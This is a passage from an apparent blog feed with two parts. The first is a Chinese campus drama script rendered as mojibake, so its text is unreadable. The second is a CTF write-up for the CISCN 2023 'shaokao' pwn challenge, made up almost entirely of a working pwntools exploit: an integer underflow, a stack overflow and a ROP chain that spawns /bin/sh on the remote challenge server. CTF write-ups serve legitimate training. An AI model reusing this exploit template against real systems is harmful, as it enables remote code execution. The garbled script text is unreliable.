ãÈóÆÔºöËÄÅÁéãÔºå‰ªñ‰ª¨‰∏§‰∏™‰∫∫Âë¢ÔºüËøô‰πàÊó©Â∞±‰∏çËßÅ‰∫ÜÔºü</p><p>ËÄÅÁéãÂ§¥‰πü‰∏çÂõûÔºö‰Ω†Âøò‰∫ÜÔºü‰ªäÂ§©ÊòØËÄÅÊùéÁîüÊó•ÔºåËÄÅÂº†Â∏¶ÁùÄ‰ªñÂ•≥ÊúãÂèã‰∏ÄËµ∑ÂéªÂ∏ÇÈáåÁªô‰ªñÂ∫ÜÁîü‰∫Ü„ÄÇ</p><p>Á®ãÔºöÈÇ£‰Ω†ÊÄé‰πàÊ≤°ÂéªÔºü</p><p>ËÄÅÁéãÔºöËøô‰∏çÂàöÊãøÂà∞ËèäËä±ÂéÇofferÔºåÂæÖ‰ºö‰∏ãÂçàË¶ÅÂéªÈÇ£ËæπÂØπÊé•‰∏Ä‰∏ãÂ∑•‰ΩúÔºåÂàÜË∫´‰πèÊúØÂïä„ÄÇ</p><p>Á®ãÁõÆÁû™Âè£ÂëÜ„ÄÇ</p><h1 id="Á¨¨‰∏âÂπï-Â§ñÊôØ-Ê≤≥Ëæπ"><a href="#Á¨¨‰∏âÂπï-Â§ñÊôØ-Ê≤≥Ëæπ" class="headerlink" title="Á¨¨‰∏âÂπï Â§ñÊôØ Ê≤≥Ëæπ"></a>Á¨¨‰∏âÂπï Â§ñÊôØ Ê≤≥Ëæπ</h1><p>‰∫∫Áâ©ÔºöÁ®ãÊôìÈùõÔºåÂç∑ÔºåÊëÜÔºåÊ≤≥Á•û</p><p>Ê≤≥Á•ûÂùêÂú®‰∏ÄËæπÔºåÁ®ãÊôìÈùõÂú®‰∏ÄËæπË∏±Ê≠•</p><p>Á®ãÔºö‰∫ãÊÉÖÂ∞±ÊòØËøôÊ†∑ÔºåÁªèËøáÂõõÂπ¥ÁöÑÂ•ãÊñóÔºåÊàëÁªà‰∫éËææÂà∞‰∫ÜËá™Â∑±ÁöÑÊ¢¶ÊÉ≥„ÄÇÂèØÊòØÁ´ôÂú®ÁªàÁÇπÂõûÊúõËøôÂõõÂπ¥ÁöÑÊóÖÈÄîÔºåÊàëÂ•ΩÂÉèÈîôËøá‰∫ÜÂ§™Â§öÈ£éÊôØÔºåÂ§±Âéª‰∫ÜÂ§™Â§öÁöÑÊóÖ‰º¥„ÄÇ</p><p>Ê≤≥Ôºö‰∫∫ÁîüÂ∞±ÊòØËøôÊ†∑ÂòõÔºåÂæóÂ§±ÂèÇÂçäÔºåÂÜçÂØªÂ∏∏‰∏çËøá„ÄÇ</p><p>Á®ãÔºàÊÑ§ÊÄíÔºâÔºö‰ΩÜËøô‰∏çÊòØÊàëÊÉ≥Ë¶ÅÁöÑÔºÅËøô‰∏çËØ•ÊòØÊàëÁöÑÂ§ßÂ≠¶ÁîüÊ¥ªÔºÅ</p><p>Ê≤≥Êó†Â•àÂú∞ÊëáÊëáÂ§¥Ôºå‰ªéÂè£Ë¢ãÈáåÊë∏Âá∫Á∫¢Ëìù‰∏§Á≤íËçØ‰∏∏ÔºöÊàëÁé∞Âú®Áªô‰Ω†‰∏ÄÊ¨°ÈáçÊñ∞ÈÄâÊã©ÁöÑÊú∫‰ºöÔºåÁ∫¢Ëâ≤ËçØ‰∏∏ËÉΩËÆ©‰Ω†ÈáçÊñ∞ÈÄâÊã©‰Ω†Ë¶ÅÊàê‰∏∫ÁöÑ‰∫∫ÔºåËìùËâ≤ËçØ‰∏∏‰ºöÂ∞Ü‰Ω†ËøáÂéªÁöÑÂõõÂπ¥Âåñ‰∏∫‰∫ëÁÉüÔºåËµ§ÊâãÁ©∫Êã≥Âú∞ÈáçÊñ∞ÂºÄÂßã„ÄÇ</p><p>ÊëÜÔºö‰Ω†ÁúãÈÇ£‰∏™ËÄÅÁéãÔºåÊàëÂ∞±Ê≤°ËßÅ‰ªñ‰∏äËøáÂá†ÂõûËØæÔºåÊØèÂ§©‰∏çÊòØÂá∫ÂéªËä±Â§©ÈÖíÂú∞Â∞±ÊòØÂú®ÂØùÂÆ§ÊâìÊ∏∏ÊàèÔºåÊúÄÂêéËøò‰∏çÊòØÈ°∫Âà©ÊãøÂà∞‰∫ÜËèäËä±ÂéÇÁöÑofferÔºüÊàëÁúãÂ∞±ÈÄâ‰ªñÂêß„ÄÇ</p><p>Âç∑ÔºöÊàë‰∏çÁõ∏‰ø°ÊúâËøôÊ†∑ÁöÑÂ•Ω‰∫ã‚Ä¶</p><p>ËØùÈü≥Êú™ËêΩÔºåÁ®ã‰∏äÂâçÂ∑≤ÁªèÊäìËµ∞‰∫ÜÁ∫¢Ëâ≤ËçØ‰∏∏Ôºå‰∏ÄÂè£Âêû‰∏ã„ÄÇ</p><p>ÁîªÈù¢‰∏ÄÈªë„ÄÇ</p><h1 id="Á¨¨ÂõõÂπï-ÂÜÖÊôØ-ÂÆøËàç"><a href="#Á¨¨ÂõõÂπï-ÂÜÖÊôØ-ÂÆøËàç" class="headerlink" title="Á¨¨ÂõõÂπï ÂÜÖÊôØ ÂÆøËàç"></a>Á¨¨ÂõõÂπï ÂÜÖÊôØ ÂÆøËàç</h1><p>‰∫∫Áâ©ÔºöÁ®ã Âç∑ ÊëÜ</p><p>Á®ãÂú®ÂÆøËàçÊâìÊ∏∏ÊàèÔºåÊâìÂá∫‰∏Ä‰∏™ÊºÇ‰∫ÆÁöÑ‰∫îÊùÄ</p><p>ÊëÜÔºàÂøÉÊª°ÊÑèË∂≥ÔºâÔºöÊàëËØ¥Âí±ËøôÂá†Âπ¥Ôºå‰∏çÂèóÈ´òÊï∞ÁöÑÊäòÁ£®ÔºåËÑëÁªÜËÉûÁöÑÂ≠òÊ¥ªÁéáÁúüÊòØÂ§ßÂπÖÊèêÂçá‰∫ÜÂïä„ÄÇ</p><p>Âç∑Ôºà‰∏çÂ±ëÔºâÔºöÊòØÂïäÔºå‰∏çÂéªÂõ¥ÁåéÁåõÁä∏Ë±°ÁúüÊòØÂüãÊ≤°‰∫∫Êâç‰∫Ü„ÄÇ</p><p>Á®ãÔºö‰Ω†Âà´ÁÆ°ÔºåËá≥Â∞ëÊàëËøôÂá†Âπ¥ËøáÁöÑÂÉèÁ•û‰ªô„ÄÇ</p><p>Âç∑ÔºàÈò¥Èò≥ÊÄ™Ê∞îÔºâÔºöÁ•û‰ªôÈ©¨‰∏äÂ∞±Ë¶ÅËÑ∏Êúù‰∏ãËêΩÂú∞ÂíØ„ÄÇ</p><p>ÊëÜÔºöÂà´ÔºåÂí±ÁöÑofferÂ∑≤ÁªèÂú®Ë∑Ø‰∏ä‰∫Ü„ÄÇ</p><p>Âç∑Ôºö‰Ω†‰πü‰∏çÁúã‰ªäÂ§©Âá†Âè∑‰∫ÜÔºüÊÇ®ËøôofferÊòØM87Êòü‰∫ëËµ∞Áî≥ÈÄöÂø´ÈÄíÂØÑÊù•ÁöÑÂêß</p><p>Á®ãÁúãÊó•ÂéÜÔºåÊÉä‰∫Ü</p><p>ÊëÜÔºöÂíãÂäû</p><p>Á®ãÔºöÊâæÈÇ£ËÄÅÂ§¥ÁêÜËÆ∫ÂéªÔºÅ</p><h1 id="Á¨¨‰∫îÂπï-Â§ñÊôØ-Ê≤≥Ëæπ"><a href="#Á¨¨‰∫îÂπï-Â§ñÊôØ-Ê≤≥Ëæπ" class="headerlink" title="Á¨¨‰∫îÂπï Â§ñÊôØ Ê≤≥Ëæπ"></a>Á¨¨‰∫îÂπï Â§ñÊôØ Ê≤≥Ëæπ</h1><p>‰∫∫Áâ©Ôºö Á®ã Âç∑ ÊëÜ Ê≤≥</p><p>Á®ãÂà∞Ê≤≥ËæπÁ†¥Âè£Â§ßÈ™ÇÔºöÁ≥üËÄÅÂ§¥Â≠êÔºÅÁªôÊàëÊªöÂá∫Êù•ÔºÅÊàëÁöÑofferÂë¢ÔºÅ</p><p>Ê≤≥Á•ûÂú®Ë∫´ÂêéÂá∫Áé∞ÔºåÈÇ™È≠Ö‰∏ÄÁ¨ëÔºö‰Ω†ÁàπÂèà‰∏çÊòØËèäËä±ÂéÇËÄÅÊùø</p><p>Á®ãÂáù‰Ωè„ÄÇ</p><p>ÈöèÂêéÊÑüÂà∞ÊÑ§ÊÄíÔºåÊ≠§Â§ÑÂ∫îÊúâÁôΩÈáë‰πãÊòüÂ§ÑÂàëÊõ≤ÂìçËµ∑ÔºåÁ®ãËΩ¨Ë∫´Èù¢ÂêëÊ≤≥Á•ûÔºåË∫´ÂêéÂá∫Áé∞ÊëÜÂíåÂç∑„ÄÇ</p><p>ÊëÜÔºåÂç∑ÔºöÊ¨ßÊãâÔºÅÔºà‰∏ÄÊã≥ÊâìÂÄíÊ≤≥Á•ûÔºâ</p><p>Á®ãÔºöÊúãÂèã‰ª¨ÔºåÊàëÊòéÁôΩ‰∫ÜÔºåÔºàËµ∞ËøëÊ≤≥Á•ûÂÄí‰∏ãÁöÑË∫´‰ΩìÔºâÔºåÊ≤°Êúâ‰∫∫ÂèØ‰ª•Â∏ÆÊàëÂÜ≥ÂÆöÊàëÁöÑÁîüÂëΩÔºå‰πüÊ≤°Êúâ‰∫∫ÂèØ‰ª•‰∏∫ÊàëÂ§±Ë¥•ÁöÑÈÄâÊã©Ë¥üË¥£ÔºàÂêåÊó∂ÂçïËÜùËπ≤‰∏ãÔºåÂú®Ê≤≥Á•ûË∫´‰∏äÊë∏Á¥¢ÔºåÊâæÂà∞ËìùËâ≤ËçØ‰∏∏ÔºâÔºåÊàëÊÉ≥ËøáÂ•ΩÊàëËá™Â∑±ÁöÑ‰∫∫ÁîüÔºà‰∏§Ê†πÊâãÊåá‰∏æËµ∑ËçØ‰∏∏ÔºåÂØπÁùÄÂ§™Èò≥ÁöÑÊñπÂêëÔºâ</p><p>Âç∑ÔºöÊè°Á¥ßÊØè‰∏ÄÂàÜÈíüÁöÑÁîüÂëΩ</p><p>ÊëÜÔºöÂáÜÂ§áËøéÊé•ÊØè‰∏Ä‰∏™ÂΩì‰∏ãÁöÑÁæéÂ•Ω</p><p>Á®ãÔºöÂØπËá™Â∑±ÁöÑ‰∏ÄÂàáË°å‰∏∫Ë¥üË¥£</p><p>‰∏â‰∫∫ÔºöÊó†ÊÄ®Êó†ÊÇî„ÄÇ</p><p>Á®ãÂêû‰∏ãËçØ‰∏∏ÔºåÁîªÈù¢‰∏ÄÈªë„ÄÇ</p><h1 id="Á¨¨ÂÖ≠Âπï"><a href="#Á¨¨ÂÖ≠Âπï" class="headerlink" title="Á¨¨ÂÖ≠Âπï"></a>Á¨¨ÂÖ≠Âπï</h1><p>‰∏éÁîªÈù¢ÂêåÊ≠•ÁöÑÊóÅÁôΩÔºö‚ÄúÈÇ£Êó∂ÂÄôÊàëÁ™ÅÁÑ∂ÊÑèËØÜÂà∞ÔºåÊØèÊù°Ê∫™ÊµÅÈÉΩÊúâËá™Â∑±ÁöÑËΩ®ËøπÔºåÁªÜÂ∞èÁöÑ‰∏çÂøÖÂº∫Ê±ÇÊ∞îÂäøÁ£ÖÁ§¥ÔºåÈ´ò‰∫¢ÁöÑ‰∏çÂøÖÁæ°ÊÖïÂÆõËΩ¨ËΩªÁõà„ÄÇÊàëÊú¨Êù•Â∞±‰∏çÂøÖÊàê‰∏∫‰ªª‰Ωï‰∫∫ÔºåÊàëÂè™Ë¶ÅÂÅöÔºåÂΩì‰∏ãÊúÄÂ•ΩÁöÑËá™Â∑±„ÄÇ</p><h2 id="6-1-Á®ãÊôìÈùõÂú®Ëá™‰π†ÂÆ§ÂíåÂêåÂ≠¶ÁÉ≠ÁÅ´ÊúùÂ§©Âú∞ËÆ®ËÆ∫Êï∞Â≠¶ÈóÆÈ¢ò"><a href="#6-1-Á®ãÊôìÈùõÂú®Ëá™‰π†ÂÆ§ÂíåÂêåÂ≠¶ÁÉ≠ÁÅ´ÊúùÂ§©Âú∞ËÆ®ËÆ∫Êï∞Â≠¶ÈóÆÈ¢ò" class="headerlink" title="6-1 Á®ãÊôìÈùõÂú®Ëá™‰π†ÂÆ§ÂíåÂêåÂ≠¶ÁÉ≠ÁÅ´ÊúùÂ§©Âú∞ËÆ®ËÆ∫Êï∞Â≠¶ÈóÆÈ¢ò"></a>6-1 Á®ãÊôìÈùõÂú®Ëá™‰π†ÂÆ§ÂíåÂêåÂ≠¶ÁÉ≠ÁÅ´ÊúùÂ§©Âú∞ËÆ®ËÆ∫Êï∞Â≠¶ÈóÆÈ¢ò</h2><h2 id="6-2-Á®ãÊôìÈùõÂíåÂ•öÂ∞èÂΩ©Âú®Â§úÊôöÁöÑÁÅØÂÖâ‰∏ãÊº´Ê≠•ÔºåËµ∞Âà∞‰πãÂâçÔºà2-3ÔºâÁ®ãÊôìÈùõÂàÜÊâãÁöÑ‰ΩçÁΩÆÊó∂Ôºå‰∏§‰∫∫Á™ÅÁÑ∂Áõ∏ËßÜ‰∏ÄÁ¨ë"><a href="#6-2-Á®ãÊôìÈùõÂíåÂ•öÂ∞èÂΩ©Âú®Â§úÊôöÁöÑÁÅØÂÖâ‰∏ãÊº´Ê≠•ÔºåËµ∞Âà∞‰πãÂâçÔºà2-3ÔºâÁ®ãÊôìÈùõÂàÜÊâãÁöÑ‰ΩçÁΩÆÊó∂Ôºå‰∏§‰∫∫Á™ÅÁÑ∂Áõ∏ËßÜ‰∏ÄÁ¨ë" class="headerlink" title="6-2 Á®ãÊôìÈùõÂíåÂ•öÂ∞èÂΩ©Âú®Â§úÊôöÁöÑÁÅØÂÖâ‰∏ãÊº´Ê≠•ÔºåËµ∞Âà∞‰πãÂâçÔºà2-3ÔºâÁ®ãÊôìÈùõÂàÜÊâãÁöÑ‰ΩçÁΩÆÊó∂Ôºå‰∏§‰∫∫Á™ÅÁÑ∂Áõ∏ËßÜ‰∏ÄÁ¨ë"></a>6-2 Á®ãÊôìÈùõÂíåÂ•öÂ∞èÂΩ©Âú®Â§úÊôöÁöÑÁÅØÂÖâ‰∏ãÊº´Ê≠•ÔºåËµ∞Âà∞‰πãÂâçÔºà2-3ÔºâÁ®ãÊôìÈùõÂàÜÊâãÁöÑ‰ΩçÁΩÆÊó∂Ôºå‰∏§‰∫∫Á™ÅÁÑ∂Áõ∏ËßÜ‰∏ÄÁ¨ë</h2><h2 id="6-3-Á®ãÊôìÈùõÂú®Ë∂≥ÁêÉÂú∫‰∏äÂ•îË∑ëÔºå‰∏Ä‰∏™Â∏ÖÊ∞îÁöÑÂ∞ÑÈó®ÔºåÁêÉËøõ‰∫ÜÔºåÂ•öÂ∞èÂΩ©Ê¨¢Âëº„ÄÇ"><a href="#6-3-Á®ãÊôìÈùõÂú®Ë∂≥ÁêÉÂú∫‰∏äÂ•îË∑ëÔºå‰∏Ä‰∏™Â∏ÖÊ∞îÁöÑÂ∞ÑÈó®ÔºåÁêÉËøõ‰∫ÜÔºåÂ•öÂ∞èÂΩ©Ê¨¢Âëº„ÄÇ" class="headerlink" title="6-3 Á®ãÊôìÈùõÂú®Ë∂≥ÁêÉÂú∫‰∏äÂ•îË∑ëÔºå‰∏Ä‰∏™Â∏ÖÊ∞îÁöÑÂ∞ÑÈó®ÔºåÁêÉËøõ‰∫ÜÔºåÂ•öÂ∞èÂΩ©Ê¨¢Âëº„ÄÇ"></a>6-3 Á®ãÊôìÈùõÂú®Ë∂≥ÁêÉÂú∫‰∏äÂ•îË∑ëÔºå‰∏Ä‰∏™Â∏ÖÊ∞îÁöÑÂ∞ÑÈó®ÔºåÁêÉËøõ‰∫ÜÔºåÂ•öÂ∞èÂΩ©Ê¨¢Âëº„ÄÇ</h2>]]></content>
    
    
    <summary type="html">Âõæ‰∏Ä‰πê</summary>
    
    
    
    <category term="literature" scheme="http://deepunk.icu/categories/literature/"/>
    
    
    <category term="literature" scheme="http://deepunk.icu/tags/literature/"/>
    
    <category term="drama" scheme="http://deepunk.icu/tags/drama/"/>
    
  </entry>
  
  <entry>
    <title>ciscn2023pwnÂÆùÂÆùÈ¢òËß£</title>
    <link href="http://deepunk.icu/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3/"/>
    <id>http://deepunk.icu/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3/</id>
    <published>2023-05-29T15:26:54.000Z</published>
    <updated>2023-12-09T07:11:23.568Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ÂùêÁâ¢‰∫ÜÔºåÂè™‰ºöÂÅöbabyÈ¢ò</p></blockquote><h1 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a>shaokao</h1><p>Êï¥Âûã‰∏ãÊ∫¢ÔºåÁÑ∂ÂêéÊúâ‰∏™Ê†àÊ∫¢Âá∫ÔºåÁõ¥Êé•Áî®ROPgadgetÁîüÊàêropchain</p><p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173718539.png" alt="image-20230528173718539"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;123.56.251.120&quot;</span></span><br><span class="line">port = <span class="number">36293</span></span><br><span class="line"><span class="comment">#pl = process(&quot;./shaokao&quot;)</span></span><br><span class="line">pl = remote(host,  port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line">pl.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line">pl.sendline(<span class="string">&quot;-1145144&quot;</span>)</span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="string">b&quot;a&quot;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += p64(<span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line">pl.sendline(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pl.interactive()</span><br></pre></td></tr></table></figure><h1 id="funcanary"><a href="#funcanary" class="headerlink" 